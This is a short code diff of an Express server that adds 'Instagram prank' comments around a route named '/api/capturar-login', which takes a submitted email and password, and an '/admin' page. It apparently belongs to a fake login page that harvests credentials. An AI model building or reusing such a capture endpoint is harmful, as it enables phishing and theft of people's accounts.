@@ -307,7 +307,7 @@ app.post('/api/avaliar', async (req, res) => {
 
 
 
-
+//--------------------brincadeira do instagram-------------------
 // Recebe login
 app.post('/api/capturar-login', (req, res) => {
   const { email, senha } = req.body;
@@ -354,6 +354,7 @@ app.get('/admin', (req, res) => {
   res.send(html);
 });
 
+//--------------------brincadeira do instagram-------------------
 
 app.listen(PORT, '0.0.0.0', () => {
   console.log(`Servidor rodando em http://0.0.0.0:${PORT}`);
